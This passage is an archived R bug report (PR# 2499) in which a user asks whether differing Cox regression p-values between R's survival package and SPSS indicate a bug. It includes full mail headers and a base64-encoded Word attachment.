Best regards,

Marc Schwartz

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2499 *
Subject: survival bug?
From: Pius Korner <korner@eco.umnw.ethz.ch>
Date: Mon, 27 Jan 2003 17:28:11 +0100
--Needs to resubmit in more useful format.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2499 <==
From korner@eco.umnw.ethz.ch  Mon Jan 27 17:28:27 2003
Received: from xsmtp.ethz.ch (xsmtp.ethz.ch [129.132.97.6])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA07671
	for <r-bugs@biostat.ku.dk>; Mon, 27 Jan 2003 17:28:26 +0100 (MET)
Received: from xfe2.d.ethz.ch ([192.168.36.11]) by xsmtp.ethz.ch with Microsoft SMTPSVC(5.0.2195.5329);
	 Mon, 27 Jan 2003 17:27:39 +0100
Received: from eco.umnw.ethz.ch ([129.132.15.199]) by xfe2.d.ethz.ch with Microsoft SMTPSVC(5.0.2195.5329);
	 Mon, 27 Jan 2003 17:27:38 +0100
Date: Mon, 27 Jan 2003 17:28:11 +0100
Mime-Version: 1.0 (Apple Message framework v548)
Content-Type: multipart/mixed; boundary=Apple-Mail-27-953181986
Subject: survival bug?
From: Pius Korner <korner@eco.umnw.ethz.ch>
To: r-bugs@biostat.ku.dk
Message-Id: <5397D74A-3214-11D7-912D-000A27D7DD96@eco.umnw.ethz.ch>
X-Mailer: Apple Mail (2.548)
X-OriginalArrivalTime: 27 Jan 2003 16:27:38.0955 (UTC) FILETIME=[01FFB1B0:01C2C621]


--Apple-Mail-27-953181986
Content-Transfer-Encoding: 7bit
Content-Type: text/plain;
	charset=US-ASCII;
	format=flowed

a possible bug with survival analysis - either in R or in SPSS...

find more details in bug.doc, and the data in bug.txt

best
Pius Korner



--Apple-Mail-27-953181986
Content-Disposition: attachment
Content-Type: multipart/appledouble;
	boundary=Apple-Mail-28-953181987


--Apple-Mail-28-953181987
Content-Disposition: attachment;
	filename=bug.doc
Content-Transfer-Encoding: base64
Content-Type: application/applefile;
	name="bug.doc"

AAUWBwACAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAJAAAAPgAAAAoAAAADAAAASAAAAAcAAAACAAAA
TwAAAR5XOEJOTVNXRAAAYnVnLmRvYwAAAQAAAAEAAAAAAAAAAB4AAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAB
AAAAAAAAAAAeAAAAAAAAAAAAHAAe//8=

--Apple-Mail-28-953181987
Content-Disposition: attachment;
	filename=bug.doc
Content-Transfer-Encoding: base64
Content-Type: application/msword;
	x-mac-creator=4D535744;
	x-unix-mode=0644;
	x-mac-type=5738424E;
	name="bug.doc"

0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAABAAAAJQAAAAAAAAAA
EAAAJwAAAAEAAAD+////AAAAACQAAAD/////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////s
pcEAsUAJBAAA8BK/AAAAAAABEQABAAEABgAAUwkAAA4AamJqYpgKmAoAAAAAAAAAAAAAAAAAAAAA
AAAJBBYAHhYAAPJoAQDyaAEAUwMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//w8AAAAA
AAAAAAD//w8AAAAAAAAAAAD//w8AAAAAAAAAAAAAAAAAAAAAAGwAAAAAAKIAAAAAAAAAogAAAKIA
AAAAAAAAogAAAAAAAACiAAAAAAAAAKIAAAAAAAAAogAAABQAAAAAAAAAAAAAANIAAAAAAAAA0gAA
AAAAAADSAAAAAAAAANIAAAAAAAAA0gAAAAwAAADeAAAAFAAAANIAAAAAAAAAswEAAGACAAD+AAAA
AAAAAP4AAAAAAAAA/gAAAAAAAAD+AAAAAAAAAP4AAAAAAAAA/gAAAAAAAAD+AAAAAAAAAP4AAAAA
AAAAcAEAAAIAAAByAQAAAAAAAHIBAAAAAAAAcgEAAAAAAAByAQAAAAAAAHIBAAAAAAAAcgEAACwA
AAATBAAAIAIAADMGAABiAAAAngEAABUAAAAAAAAAAAAAAAAAAAAAAAAAogAAAAAAAAD+AAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAD+AAAAAAAAAP4AAAAAAAAA/gAAAAAAAAD+AAAAAAAAAJ4BAAAAAAAA
/gAAAAAAAACiAAAAAAAAAKIAAAAAAAAA/gAAAAAAAAAAAAAAAAAAAP4AAAAAAAAA/gAAAAAAAAD+
AAAAAAAAAP4AAAAAAAAA/gAAAAAAAAD+AAAAAAAAAKIAAAAAAAAA/gAAAAAAAACiAAAAAAAAAP4A
AAAAAAAAcAEAAAAAAAAAAAAAAAAAAP4AAAAAAAAAtgAAAA4AAADEAAAADgAAAKIAAAAAAAAAogAA
AAAAAACiAAAAAAAAAKIAAAAAAAAA/gAAAAAAAABwAQAAAAAAAP4AAAByAAAA/gAAAAAAAAAAAAAA
AAAAAHABAAAAAAAAogAAAAAAAACiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAEAAAAAAAAAAAAAAAAAAPIAAAAMAAAAiw1bugAA
AADSAAAAAAAAANIAAAAAAAAA/gAAAAAAAABwAQAAAAAAAAAAAAAAAAAAcAEAAAAAAACzAQAAAAAA
ALMBAAAAAAAAcAEAAAAAAACVBgAAAAAAAP4AAAAAAAAAlQYAAAAAAABwAQAAAAAAAP4AAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABADDAA8A5QAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABEZWFy
IFINDWlzIHRoYXQgYSBidWc/PzoNDVItY29kZToNIyBkYXRhIHByZXBhcmF0aW9uDWQuZGF0YTwt
cmVhZC50YWJsZSgiYnVnLnR4dCIsaGVhZGVyPVQpDWQuZGF0YSRmYWN0MTwtYXMuZmFjdG9yKGQu
RjEkZmFjdDEpDWQuZGF0YSRmYWN0MjwtYXMuZmFjdG9yKGQuRjEkZmFjdDIpDWxpYnJhcnkoc3Vy
dml2YWwpDSMgQ294IFByb3BvcnRpb25hbCBIYXphcmQNci5jb3g8LWNveHBoKFN1cnYodGltZSxk
ZWx0YSl+ZmFjdDErZmFjdDIrY292YXIsZGF0YT1kLmRhdGEpDWRyb3AxKHIuY294LHRlc3Q9IkNo
aXNxIikNDW91dHB1dDoNU2luZ2xlIHRlcm0gZGVsZXRpb25zDQ1Nb2RlbDoNU3Vydih0aW1lLCBk
ZWx0YSkgfiBmYWN0MSArIGZhY3QyICsgY292YXINICAgICAgIERmICAgIEFJQyAgICBMUlQgICBQ
cihDaGkpICAgIA08bm9uZT4gICAgODI3LjkwICAgICAgICAgICAgICAgICAgICAgDWZhY3QxICAg
NyA4MjguNDkgIDE0LjU4ICAgMC4wNDE3MiAqICANZmFjdDIgICA0IDg0My41NCAgMjMuNjMgOS40
NTVlLTA1ICoqKg1jb3ZhciAgIDEgODI1Ljk4ICAgMC4wOCAgIDAuNzc3NjkgICAgDS0tLQ1TaWdu
aWYuIGNvZGVzOiAgMCBgKioqJyAwLjAwMSBgKionIDAuMDEgYConIDAuMDUgYC4nIDAuMSBgICcg
MQ0NDWlmIEkgZG8gdGhlIHNhbWUgb24gc3BzcywgdGhlIHAtdmFsdWUgZm9yIGZhY3QxIGlzIDAu
MDIsIGZvciBmYWN0MiwgaXRzIDAuMDAxLiBJcyB0aGF0IGEgYnVnIG9yIGp1c3QgZGlmZmVyZW50
IHByb2NlZHVyZXM/DQ1hbHNvLCBpZiBOQSdzIGFyZSBpbiB0aGUgZmlsZSwgdGhlIHAtdmFsdWVz
IHNlZW0gdG8gYmUgY29tcGxldGVseSBpbXBvc3NpYmxlLi4uDQ1iZXN0DVBpdXMNDQAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAiBgAA
JAYAADQGAABQBgAAtgYAAM8GAAAnBwAAMAcAAFIJAABTCQAAAPnx+eri6gDZ1AAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAIT0oHAFFKBwAAEUIqAU9KBwBRSgcAcGgAAAAADzUIgU9KBgBQSgAA
UUoGAAxPSgUAUEoAAFFKBQAADzUIgU9KBABQSgAAUUoEAAxPSgMAUEoAAFFKAwAKAAYAAAcGAAAI
BgAAGQYAABoGAAAiBgAANQYAAFwGAACABgAApAYAALYGAADQBgAADQcAACcHAAAoBwAAMAcAAEYH
AABHBwAATgcAAHgHAACeBwAAxAcAAOoHAAAQCAAANggAADoIAAB5CAAA/QAAAAAAAAAAAAAAAP0A
AAAAAAAAAAAAAAD9AAAAAAAAAAAAAAAA/QAAAAAAAAAAAAAAAP0AAAAAAAAAAAAAAADhAAAAAAAA
AAAAAAAA4QAAAAAAAAAAAAAAAOEAAAAAAAAAAAAAAADhAAAAAAAAAAAAAAAA4QAAAAAAAAAAAAAA
AOEAAAAAAAAAAAAAAADhAAAAAAAAAAAAAAAA4QAAAAAAAAAAAAAAAP0AAAAAAAAAAAAAAAD9AAAA
AAAAAAAAAAAA/QAAAAAAAAAAAAAAAP0AAAAAAAAAAAAAAAD9AAAAAAAAAAAAAAAA/QAAAAAAAAAA
AAAAAP0AAAAAAAAAAAAAAAD9AAAAAAAAAAAAAAAA/QAAAAAAAAAAAAAAAP0AAAAAAAAAAAAAAAD9
AAAAAAAAAAAAAAAA/QAAAAAAAAAAAAAAAP0AAAAAAAAAAAAAAAAAAAAAHAAAMSQANyQAOCQASCQA
DcYmAAzQAqAFcAhACxAO4BCwE4AWUBkgHPAewCEAAAAAAAAAAAAAAAAAAQAAABoABgAABwYAAAgG
AAAZBgAAGgYAACIGAAA1BgAAXAYAAIAGAACkBgAAtgYAANAGAAANBwAAJwcAACgHAAAwBwAARgcA
AEcHAABOBwAAeAcAAJ4HAADEBwAA6gcAABAIAAA2CAAAOggAAHkIAAB6CAAAewgAAPYIAAD3CAAA
RwkAAEgJAABNCQAAUgkAAFMJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI3kIAAB6CAAAewgA
APYIAAD3CAAARwkAAEgJAABNCQAAUgkAAFMJAAD9AAAAAAAAAAAAAAAA/QAAAAAAAAAAAAAAAP0A
AAAAAAAAAAAAAAD9AAAAAAAAAAAAAAAA/QAAAAAAAAAAAAAAAP0AAAAAAAAAAAAAAAD9AAAAAAAA
AAAAAAAA/QAAAAAAAAAAAAAAAP0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAJHAAfsNAvILDgPSGw
CAcisAgHI5CgBSSQoAUlsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASAA8ACgABAGkADwAC
AAgACAAIADQAAEDx/wIANAAAAAYATgBvAHIAbQBhAGwAAAACAAAAFABDShgAT0oIAFBKCABRSggA
bUgJBAAAAAAAAAAAAAAAAAAAAAAAADwAQUDy/6EAPAAAABYARABlAGYAYQB1AGwAdAAgAFAAYQBy
AGEAZwByAGEAcABoACAARgBvAG4AdAAAAAAAAAAAAAAAAAAAAAAAUwMAAAUAABYAAAAA/////wEA
AAAEIP//AQCgepkAAAAAAFMDAAAAAAAAAAAABgAAUwkAAAcAAAAABgAAeQgAAFMJAAAIAAAACgAA
AAAGAABTCQAACQAAAP//AgAAAAsAcABpAHUAcwAgAGsAbwByAG4AZQByACkAVABvAHAAbwBsAGkA
bgBvACAASABEACAAOgBVAHMAZQByAHMAOgBrAG8AcgBuAGUAcgA6AEQAZQBzAGsAdABvAHAAOgBi
AHUAZwAuAGQAbwBjAP9AA4ABAFIDAABSAwAA3GOyAwEAAQBSAwAAAAAAAHgCAAAAAAAAAwADACMD
owICEAAAAAAAAABTAwAAUAAADABAAAAJAAAARwaQAQAAAAICBgMFBAUCAwAAAAMAAAAAAAAAAAAA
AAABAAAAAAAAAFQAaQBtAGUAcwAgAE4AZQB3ACAAUgBvAG0AYQBuAAAANQaQAQIAAAIABQAAAAAA
AAAAAAAQAAAAAAAAAAAAAAAAAACAAAAAAFMAeQBtAGIAbwBsAAAAMwaQAQAAAAILBgQCAgICAgAA
AAMAAAAAAAAAAAAAAAABAAAAAAAAAEEAcgBpAGEAbAAAADsGkAEAAAACAAUAAAAAAAAAAAADAAAA
AAAAAAAAAAAAAQAAAAAAAABIAGUAbAB2AGUAdABpAGMAYQAAAFEgkAFNDwAAAAAAAAAAAAAAAAAD
AAAAAAAAAAAAAAAAAQAAAAAAAABIAGUAbAB2AGUAdABpAGMAYQAtAEIAbwBsAGQAAABUAGkAbQBl
AHMAAABNAJABTQ0AAAAAAAAAAAAAAAAAAwAAAAAAAAAAAAAAAAEAAAAAAAAATAB1AGMAaQBkAGEA
RwByAGEAbgBkAGUAAABUAGkAbQBlAHMAAABXAJABTRIAAAAAAAAAAAAAAAAAAwAAAAAAAAAAAAAA
AAEAAAAAAAAATAB1AGMAaQBkAGEARwByAGEAbgBkAGUALQBCAG8AbABkAAAAVABpAG0AZQBzAAAA
QQaQAQAAAAILBQYCAgIDAgAAAAMAAAAAAAAAAAAAAAABAAAAAAAAAEEAcgBpAGEAbAAgAE4AYQBy
AHIAbwB3AAAAMwaQAQAAAAIABQAAAAAAAAAAAAMAAAAAAAAAAAAAAAABAAAAAAAAAFQAaQBtAGUA
cwAAACAABAAxCIwYAPDQAgAAaAEAAAAAVNxxJlfccSYAAAAAAQADAAAAAAAAAAAAAAABAAEAAAAE
AAMQAQAAAAAAAAAAAAAAAQABAAAAAQAAAAAAAADpAwDwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAClBsAHtAC0AIAAEjAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAHICAAAAAAgAAEAA
8BAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//xIAAAAAAAAABgBEAGUAYQByACAA
UgAAAAAAAAALAHAAaQB1AHMAIABrAG8AcgBuAGUAcgALAHAAaQB1AHMAIABrAG8AcgBuAGUAcgAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
